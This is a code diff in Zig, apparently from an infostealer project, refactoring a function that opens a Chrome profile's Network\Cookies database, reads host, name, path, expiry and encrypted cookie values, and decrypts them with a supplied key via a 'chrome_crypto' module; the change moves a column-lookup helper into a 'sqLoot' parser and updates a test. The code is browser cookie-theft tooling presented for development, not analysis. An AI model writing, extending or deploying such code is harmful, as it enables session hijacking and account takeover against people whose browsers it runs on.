@@ -3,18 +3,6 @@ const sqLoot = @import("../parsers/sqLoot.zig");
 const file_io = @import("../parsers/file_io.zig");
 const chrome_crypto = @import("../crypto/chrome_crypto.zig");
 
-fn columnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
-    const cols = db.getColumnNames(table) catch return null;
-    defer {
-        for (cols) |c| allocator.free(c);
-        allocator.free(cols);
-    }
-    for (cols, 0..) |col, i| {
-        if (std.mem.eql(u8, col, name)) return i;
-    }
-    return null;
-}
-
 pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: [32]u8) ?[][]const u8 {
     const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Network\\Cookies" }) catch return null;
     defer allocator.free(db_path);
@@ -28,12 +16,17 @@ pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: 
     const rows = db.readTable("cookies") catch return null;
     defer allocator.free(rows);
 
-    const host_key_idx = columnIndex(&db, "cookies", "host_key", allocator) orelse return null;
-    const name_idx = columnIndex(&db, "cookies", "name", allocator) orelse return null;
-    const path_idx = columnIndex(&db, "cookies", "path", allocator) orelse return null;
-    const enc_val_idx = columnIndex(&db, "cookies", "encrypted_value", allocator) orelse return null;
-    const expires_idx = columnIndex(&db, "cookies", "expires_utc", allocator) orelse return null;
-    const value_idx = columnIndex(&db, "cookies", "value", allocator);
+    const cols = db.getColumnNames("cookies") catch return null;
+    defer {
+        for (cols) |c| allocator.free(c);
+        allocator.free(cols);
+    }
+    const host_key_idx = sqLoot.findColumnIndex(cols, "host_key") orelse return null;
+    const name_idx = sqLoot.findColumnIndex(cols, "name") orelse return null;
+    const path_idx = sqLoot.findColumnIndex(cols, "path") orelse return null;
+    const enc_val_idx = sqLoot.findColumnIndex(cols, "encrypted_value") orelse return null;
+    const expires_idx = sqLoot.findColumnIndex(cols, "expires_utc") orelse return null;
+    const value_idx = sqLoot.findColumnIndex(cols, "value");
 
     var list = std.ArrayList([]const u8).init(allocator);
     errdefer {
@@ -81,6 +74,6 @@ test "extractData returns null for missing path" {
     try std.testing.expect(result == null);
 }
 
-test "columnIndex returns null for bad table" {
-    try std.testing.expect(columnIndex(undefined, "no_table", "x", std.testing.allocator) == null);
+test "findColumnIndex returns null for bad table" {
+    try std.testing.expect(sqLoot.findColumnIndex(&.{}, "x") == null);
 }
